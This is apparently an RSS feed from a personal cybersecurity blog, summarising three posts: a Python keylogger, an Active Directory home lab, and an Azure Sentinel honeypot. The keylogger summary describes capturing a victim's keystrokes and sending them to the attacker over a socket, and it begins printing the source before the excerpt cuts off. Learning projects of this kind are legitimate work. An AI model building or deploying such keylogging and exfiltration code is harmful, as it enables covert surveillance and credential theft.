<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Darren Fitzpatrick</title><link>https://darefitz.github.io/</link><description>Recent content on Darren Fitzpatrick</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 14 Apr 2023 10:46:32 -0500</lastBuildDate><atom:link href="https://darefitz.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Python Keylogger With Sockets</title><link>https://darefitz.github.io/posts/python-keylogger-with-sockets/</link><pubDate>Fri, 14 Apr 2023 10:46:32 -0500</pubDate><guid>https://darefitz.github.io/posts/python-keylogger-with-sockets/</guid><description>I created a keylogger in python and setup sockets to allow the victim machine to send me the keylog contents. The keylog content is also parsed to be presented neatly.
They keylog script captures all keystrokes and after every 5 minutes sends that file to the attacker via socket. keylogging script ran on victim&amp;rsquo;s computer:
#Python keylogger for linux and socket connection to send keylog #4/14/2023 import socket import os import pyxhook import time def send_file(): BUFFER_SIZE = 4096 # send 4096 bytes each time step host = &amp;quot;192.</description></item><item><title>Setting up a Home Lab with Active Directory and 1k+ users</title><link>https://darefitz.github.io/posts/home-lab-ad/</link><pubDate>Sun, 09 Apr 2023 17:58:53 -0500</pubDate><guid>https://darefitz.github.io/posts/home-lab-ad/</guid><description>I set up a Windows Server 2019 with Active Directory and generated 1k users with PowerShell, and use the server as a domain controller for a Windows 10 VM to connect to.
I used VMWare for the server and Win 10 Machine. First I setup the 2019 server: Then I had to ensure that I had an external internet and an internal network: After figuring out which network was the NAT I configured the ip address for the internal network based off my diagram: After, I installed Active Directory Domain Services, (AD DS) on the server.</description></item><item><title>SIEM Live Cyber Attacks</title><link>https://darefitz.github.io/posts/siem-live-cyber-attacks/</link><pubDate>Sun, 09 Apr 2023 12:24:20 -0500</pubDate><guid>https://darefitz.github.io/posts/siem-live-cyber-attacks/</guid><description>I setup Azure Sentinel (SIEM) and connect to a live virtual machine acting as a honey pot. The virtual machine is a windows 10 with all firewalls turned off to expose it to attackers ASAP. Once the VM was spun up I setup a custom powershell script that filters thru events and grabs failed login logs, then uses those events to get the attacker&amp;rsquo;s ip and uses a free geo-locate ip api service.</description></item></channel></rss>